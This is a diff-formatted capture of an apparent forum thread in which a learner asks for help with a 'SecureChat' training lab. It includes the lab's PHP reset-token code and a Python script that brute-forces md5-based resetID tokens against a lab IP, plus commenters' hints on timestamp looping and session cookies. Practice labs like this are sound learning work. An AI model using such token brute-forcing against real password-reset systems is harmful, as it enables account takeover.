@@ -1,23 +1,206 @@
+SecureChat
+Hello Comunity
+
+I am strugling with the lab "SecureChat" and I am not sure if i am missing something or if the lab is broken. I wrote a python script to bruteforce the resetID token, which is generated with this line of php code:
+
+$uid = md5( strrev(strtoupper($email)) . rand(0,99) . time() );
+
+But whatever i do, i will not get a valid token. I calculate the timestamp with an online calculator
+
+I am gratefull for any hint!
+
+Script:
+
 from hashlib import md5
 from urllib import parse
 from requests import get
-import time
 
 email = "61qwfZ@secure-chat.co.uk".upper()[::-1]
-timestamp = str(int(time.time()))  # You can adjust the time here if needed
 
-baseurl = "http://1/forgot.php?resetID="
+# UTC corrected timestamps
+#timestamp = "1671710318"
+timestamp = "1671713918"
+
+
+baseurl = "http://10.102.183.174/forgot.php?resetID="
 urls = []
 
-for i in range(0, 99):  # Loop through the possible random number (0 to 99)
-    key = email + str(i) + timestamp
+for i in range(0,99):
+    key = email+str(i)+timestamp
     hash = md5(key.encode('utf-8')).hexdigest()
     encodedhash = parse.quote(hash)
-    urls.append(baseurl + encodedhash)
+    urls.append(baseurl+hash)
 
 for url in urls:
     r = get(url)
-    if "Valid" in r.text:  # Modify this based on the response from the server
-        print(f"Valid URL: {url}")
-        print(r.text)
-        break
+    if not r.text.find("Invalid"):
+        print(url)
+        print("Valid")
+
+Upvote
+1
+
+Downvote
+
+5
+Go to comments
+
+
+Share
+Share
+
+Report
+Report
+u/firefox avatar
+firefox
+•
+Promoted
+
+[Das ist Werbung] Firefox schützt deine Privatsphäre. Nur gegen Leute, die sich im Bus oder der U-Bahn neben dich setzen und dann auf deinen Bildschirm gucken, können wir momentan noch nicht so viel machen. Aber wir sind dran!
+Learn More
+mozilla.org
+Clickable image which will reveal the video player: [Das ist Werbung] Firefox schützt deine Privatsphäre. Nur gegen Leute, die sich im Bus oder der U-Bahn neben dich setzen und dann auf deinen Bildschirm gucken, können wir momentan noch nicht so viel machen. Aber wir sind dran!
+Collapse video player
+Add a comment
+Sort by:
+
+Best
+
+Search Comments
+Expand comment search
+Comments Section
+Dangerous_Cat_288
+•
+2y ago
+•
+It looks like you are definitely on the right track! Would it be sensible to get the time as part of your code...?
+
+import time
+
+currentTime = int(time.time())
+
+Also, I suspect that you are trying to brute force a key 'historically' - so does your timestamp need to take that into account? I see from your php code snippet that this takes a random integer (your first 'for' loop) but the timestamp remains the same. Are you sure this is right? Or do you need to adjust this as well? Maybe loop through a number of 'times' at the same time?
+
+timestamp - i
+
+Last thing - is there also some sort of PHPSESSID variable you need to consider? Using the requests library, you can send cookie information with your GET request?
+
+
+Upvote
+1
+
+Downvote
+
+Reply
+reply
+
+Award
+
+Share
+Share
+
+u/MrMouse79 avatar
+MrMouse79
+•
+1y ago
+•
+what i do is copy/paste from the website and use this in a script:
+
+...
+from datetime import datetime, timedelta
+...
+# Input variables
+...
+current_time = "11:52:56 26/05/2023"
+time_format = '%H:%M:%S %d/%m/%Y'
+# Parse the time string
+dt = datetime.strptime(current_time, time_format)
+# Convert to Unix timestamp
+timestamp = int((dt - datetime(1970, 1, 1)).total_seconds())
+...
+
+that worked for me. no TZ calculations, etc.
+
+
+
+Upvote
+1
+
+Downvote
+
+Reply
+reply
+
+Award
+
+Share
+Share
+
+u/MrMouse79 avatar
+MrMouse79
+•
+1y ago
+•
+btw, is there a hint where to look for the zip password? (hint only, no solution)
+
+
+
+Upvote
+1
+
+Downvote
+
+Reply
+reply
+
+Award
+
+Share
+Share
+
+u/MrMouse79 avatar
+MrMouse79
+•
+1y ago
+•
+ok, I've solved the lab. But how the hell do you get the "b...8" password? I've solved this by not using the resources from the lab itself.
+
+DM me to tell me how you solved this. I'm curious :)
+
+
+
+Upvote
+1
+
+Downvote
+
+Reply
+reply
+
+Award
+
+Share
+Share
+
+Ok_Edge_6480
+•
+1y ago
+•
+Edited 1y ago
+•
+Hey man! What did you to do to escalate to root? Can you help me? Please send a DM
+
+
+Upvote
+1
+
+Downvote
+
+Reply
+reply
+
+Award
+
+Share
+Share
+
